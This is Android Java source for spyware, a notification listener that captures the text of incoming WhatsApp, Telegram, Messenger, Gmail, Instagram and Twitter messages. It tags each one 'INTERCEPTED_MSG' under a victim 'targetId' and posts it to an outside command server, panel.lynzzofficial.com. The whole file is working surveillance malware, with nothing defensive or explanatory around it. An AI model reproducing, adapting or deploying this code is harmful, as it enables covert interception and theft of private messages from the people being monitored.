package com.nullx.pp;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class NotificationService extends NotificationListenerService {
    // ── Update server URL ke yang benar ──────────────────────────────────────
    private static final String SERVER_BASE = "http://panel.lynzzofficial.com:2059";
    private static final String TAG = "CRPT.NOTIF";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String pkg    = sbn.getPackageName();
            Bundle extras = sbn.getNotification().extras;
            if (extras == null) return;

            String title = extras.getString("android.title", "Unknown");
            String body  = "";

            // Ekstraksi pesan
            Object textObj = extras.get("android.text");
            if (textObj != null) body = textObj.toString();

            if (body.isEmpty() || body.equals("null")) {
                CharSequence[] lines = extras.getCharSequenceArray("android.textLines");
                if (lines != null && lines.length > 0)
                    body = lines[lines.length - 1].toString();
            }

            if (pkg.equals("com.google.android.gm")) {
                String bigText = extras.getString("android.bigText");
                if (bigText != null) body = bigText;
            }

            // Filter app yang dicegat
            boolean isTarget = pkg.equals("com.whatsapp")
                    || pkg.equals("org.telegram.messenger")
                    || pkg.equals("com.facebook.orca")
                    || pkg.equals("com.google.android.gm")
                    || pkg.equals("com.instagram.android")
                    || pkg.equals("com.twitter.android");

            if (!isTarget || body.isEmpty() || body.equals("null")) return;

            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            String targetId = prefs.getString("targetId", "UNKNOWN_ID");

            relay(targetId, pkg, title, body);
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    private void relay(String targetId, String pkg, String title, String text) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_BASE + "/api/post-notification/" + targetId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setDoOutput(true);

                JSONObject json = new JSONObject();
                String label = pkg.replace("com.", "").replace("org.", "").replace("android.", "");
                json.put("title",    "[" + label.toUpperCase() + "] " + title);
                json.put("body",     text);
                json.put("package",  pkg);
                json.put("category", "INTERCEPTED_MSG");

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.toString().getBytes());
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Relay failed: " + e.getMessage());
            }
        }).start();
    }
}
